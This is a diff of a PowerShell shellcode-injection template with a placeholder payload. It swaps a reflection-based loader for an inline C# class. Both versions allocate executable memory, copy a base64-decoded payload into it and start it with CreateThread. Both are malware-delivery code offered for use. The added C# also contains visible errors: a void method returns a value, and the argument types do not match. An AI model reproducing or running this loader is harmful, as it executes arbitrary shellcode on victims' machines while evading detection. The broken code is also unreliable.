@@ -1,37 +1,53 @@
-Set-StrictMode -Version 2
+$Injector = @"
+using System;
+using System.Collections.Generic;
+using System.Text;
+using System.Runtime.InteropServices;
 
-$VAR1 = @'
-function VAR2 {
-        Param ($VAR14, $VAR15)
-        $VAR3 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+namespace Injector
+{
+    public class Shellcode
+    {
+		private static UInt32 VAR1 = 0x1000;
+		private static UInt32 VAR2 = 0x40;
+		
+		[DllImport("kernel32")]
+		private static extern UInt32 VirtualAlloc(UInt32 VAR3, UInt32 VAR4, UInt32 VAR5, UInt32 VAR6);
+		
+		[DllImport("kernel32")]
+		private static extern UInt32 WaitForSingleObject(IntPtr VAR3, UInt32 VAR4);
+		
+		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+		private delegate IntPtr VAR10(UInt32 VAR3, UInt32 VAR4, UInt32 VAR5, IntPtr VAR6, UInt32 VAR7, ref UInt32 VAR8);
+		
+		[DllImport("kernel32.dll")]
+		public static extern IntPtr LoadLibrary(string VAR3);
+		
+		[DllImport("kernel32.dll")]
+		public static extern IntPtr GetProcAddress(IntPtr VAR3, string VAR4);
+	
 
-        return $VAR3.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($VAR3.GetMethod('GetModuleHandle')).Invoke($null, @($VAR14)))), $VAR15))
+        static public void Exec(byte[] cmd)
+        {
+			IntPtr VAR11 = LoadLibrary("kernel32.dll");
+                        IntPtr VAR12 = GetProcAddress(VAR11, "CreateThread");
+			VAR10 VAR13 = (VAR10)Marshal.GetDelegateForFunctionPointer(VAR12, typeof(VAR10));
+			UInt32 VAR14 = VirtualAlloc(0, (UInt32)cmd.Length, VAR1, VAR2);
+			Marshal.Copy(cmd, 0, (IntPtr)(VAR14), cmd.Length);
+			IntPtr VAR15 = IntPtr.Zero;
+			IntPtr VAR16 = IntPtr.Zero;
+			UInt32 VAR17 = 0;
+			VAR15 = VAR13(0, 0, VAR14, VAR16, 0, ref VAR15);
+			WaitForSingleObject(VAR15, 0xFFFFFFFF);
+			return true;
+		}
+    }
 }
+"@
 
-function VAR4 {
-        Param (
-                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $VAR7,
-                [Parameter(Position = 1)] [Type] $VAR5 = [Void]
-        )
-
-        $VAR6 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-        $VAR6.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $VAR7).SetImplementationFlags('Runtime, Managed')
-        $VAR6.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $VAR5, $VAR7).SetImplementationFlags('Runtime, Managed')
-        return $VAR6.CreateType()
+Try {
+    Add-Type -TypeDefinition $Injector -Language CSharp
+} Catch {
+    Write-Output "CSharp already loaded"
 }
-
-[Byte[]]$VAR8 = [Convert]::FromBase64String("[PAYLOAD]")
-
-$VAR9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((VAR2 kernel32.dll VirtualAlloc), (VAR4 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $VAR8.Length,0x3000, 0x40)
-[System.Runtime.InteropServices.Marshal]::Copy($VAR8, 0, $VAR9, $VAR8.length)
-
-$VAR10 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((VAR2 kernel32.dll CreateThread), (VAR4 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$VAR9,[IntPtr]::Zero,0,[IntPtr]::Zero)
-[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((VAR2 kernel32.dll WaitForSingleObject), (VAR4 @([IntPtr], [Int32]))).Invoke($VAR10,0x0) | Out-Null
-'@
-
-If ([IntPtr]::size -eq 8) {
-        Start-Job { param($VAR11) IEX $VAR11 } -RunAs32 -Argument $VAR1 | Wait-Job | Receive-Job
-}
-else {
-        IEX $VAR1
-}
+[Injector.Shellcode]::Exec([Convert]::FromBase64String("[PAYLOAD]"));
